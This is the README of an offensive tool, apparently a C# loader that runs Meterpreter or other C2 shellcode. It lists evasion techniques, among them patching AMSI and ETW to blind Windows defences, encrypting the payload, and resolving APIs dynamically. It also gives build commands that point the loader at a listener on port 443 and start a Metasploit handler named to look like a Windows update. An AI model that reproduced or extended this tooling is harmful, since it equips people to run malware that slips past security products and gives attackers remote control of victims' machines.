# loader

C# meterpreter shellcode loader.

- D/Invoke (`LoadLibrary` + `GetProcAddress`)
- AES-256-CBC decryption (fresh key + IV per build)
- AMSI bypass (`AmsiScanBuffer` -> `E_INVALIDARG`)
- ETW bypass (`EtwEventWrite` -> `ret`)
- RW -> RX (no RWX)
- `CreateThread` + `WaitForSingleObject(INFINITE)`

## Example

```bash
./build_loader.py -l 192.168.x.x -p 443
msfconsole -q -r WindowsUpdate_handler.rc
```

Custom shellcode (Sliver/Mythic/CS):

```bash
./build_loader.py --shellcode /path/to/shellcode.bin
```
